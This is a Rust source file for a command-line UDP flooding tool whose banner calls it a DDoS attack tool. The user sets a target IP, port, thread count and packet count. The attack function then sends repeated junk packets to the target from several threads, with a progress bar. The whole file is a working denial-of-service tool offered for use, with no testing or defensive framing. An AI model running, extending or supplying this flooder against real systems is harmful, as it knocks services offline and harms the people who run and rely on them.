use std::net::UdpSocket;
use std::sync::Arc;
use std::thread;
use crossterm::{execute, style::{Color, PrintStyledContent, Stylize}};
use indicatif::ProgressStyle;

fn main() {
    let title = r#"  
              _____  _____   ____   _____            _   _             _         _              _ 
             |  __ \|  __ \ / __ \ / ____|          | | | |           | |       | |            | |
             | |  | | |  | | |  | | (___        __ _| |_| |_ __ _  ___| | __    | |_ ___   ___ | |
             | |  | | |  | | |  | |\___ \      / _` | __| __/ _` |/ __| |/ /    | __/ _ \ / _ \| |
             | |__| | |__| | |__| |____) |    | (_| | |_| || (_| | (__|   <     | || (_) | (_) | |
             |_____/|_____/ \____/|_____/      \__,_|\__|\__\__,_|\___|_|\_\     \__\___/ \___/|_|
                                                                                      
    "#;
    let help_text = "   Type '/help' or /? to see the help menu";
    let help_content = r#"
        -type '/host' to set the target ip address
        -type '/port' to set the target port by default 49160
        -type '/threads' to set the number of threads by default 1
        -type '/packets' to set the total number of packets by default 1
        -type '/start' to start the attack
        -type '/exit' to exit the program
        -type '/help' or /? to see the help menu
        -any command should be written as '/command value'
    "#;
    let mut running: bool = true;

    let mut target_ip = "0.0.0.0".to_string();
    let mut port = "49160".to_string();
    let mut total_packets: i64 = 1;
    let mut threads: i64 = 1;

    print(title.to_string(), Color::Red);
    print(help_text.to_string(), Color::Green);
    print("Made by mathishp33".to_string(), Color::Blue);

    while running {
        print(">>>".to_string(), Color::Yellow);

        let mut input = String::new();
        std::io::stdin().read_line(&mut input).expect("Failed to read line");
        let input = input.trim();

        if input == "/help" || input == "/?" || input == "help" {
            print(help_content.to_string(), Color::Green);

        } else if input == "/exit" || input == "exit" {
            print("Exited ...".to_string(), Color::Red);
            running = false;

        } else if input.starts_with("/host") || input.starts_with("host") {
            if input.split_whitespace().count() == 2 {
                let parts: Vec<&str> = input.split_whitespace().collect();
                target_ip = parts[1].to_string();
                println!("Target IP successfully set to: {}", target_ip);
            } else {
                println!("Invalid format, must contain a space");
            }
            
        } else if  input.starts_with("/port") || input.starts_with("port"){
            if input.split_whitespace().count() == 2 {
                let parts: Vec<&str> = input.split_whitespace().collect();
                port = parts[1].to_string();
                println!("Port successfully set to: {}", port);
            } else {
                println!("Invalid format, must contain a space");
            }

        } else if input.starts_with("/threads") || input.starts_with("threads") {
            if input.split_whitespace().count() == 2 {
                let parts: Vec<&str> = input.split_whitespace().collect();
                match parts[1].parse::<i64>() {
                Ok(new_threads) => {
                    threads = new_threads;
                    print(format!("Number of threads successfully set to: {}", threads), Color::Cyan);
                },
                    Err(e) => print(format!("Invalid format: {}", e), Color::Red),
                }
            } else {
                println!("Invalid format, must contain a space");
            }

        } else if input.starts_with("/packets") || input.starts_with("packets") {
            if input.split_whitespace().count() == 2 {
                let parts: Vec<&str> = input.split_whitespace().collect();
                match parts[1].parse::<i64>() {
                    Ok(new_total_packets) => {
                    total_packets = new_total_packets;
                    print(format!("Number of packets successfully set to: {}", total_packets), Color::Cyan);
                },
                    Err(e) => print(format!("Invalid format: {}", e), Color::Red),
                }
            } else {
                println!("Invalid format, must contain a space");
            }

        } else if input.starts_with("/start") || input.starts_with("start") {
            println!("truc {}", total_packets);
            let e = attack(&target_ip, &port, total_packets, threads);
            if e.is_err() {
                print(format!("Error: {}", e.unwrap_err()), Color::Red);
            }
            else {
                print("Attack successfully finished !".to_string(), Color::Blue);
            }

        } else {
            print(("Invalid command").to_string(), Color::Red);
        }
    }
}

fn print(text: String, color : Color) {
    execute!(
        std::io::stdout(),
        PrintStyledContent("\n".to_string().with(Color::Reset)),
        PrintStyledContent(text.to_string().with(color)),
    ).unwrap();
}

fn attack(target_ip: &str, port: &str, total_packets: i64, threads: i64) -> std::io::Result<()> {
    let target_ip = target_ip.to_string() + ":" + port;
    let target_ip = target_ip.parse::<std::net::SocketAddr>().expect("Invalid IP address");
    let thread_count = threads.min(num_cpus::get() as i64);
    let packets_per_thread: i64 = total_packets / thread_count;
    
    let pb = Arc::new(indicatif::ProgressBar::new(total_packets as u64));
    pb.set_style(ProgressStyle::default_bar()
        .template("{bar:40} {percent}%")
        .progress_chars("=> "));

    let socket = Arc::new(UdpSocket::bind("0.0.0.0:0")?);
    socket.set_nonblocking(true)?;
    socket.connect(target_ip)?;

    let mut handles = Vec::new();

    let payload = b"daaaaataaaaa";
    for _i in 0..thread_count {
        let socket_clone = Arc::clone(&socket);
        let pb_clone = Arc::clone(&pb);
        let handle = thread::spawn(move || {
            for _j in 0..packets_per_thread {
                pb_clone.inc(1);
                if let Err(err) = socket_clone.send(payload) {
                    eprintln!("Error sending packet: {}", err);
                }
            }
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.join().expect("Thread panicked");
    }

    Ok(())
}
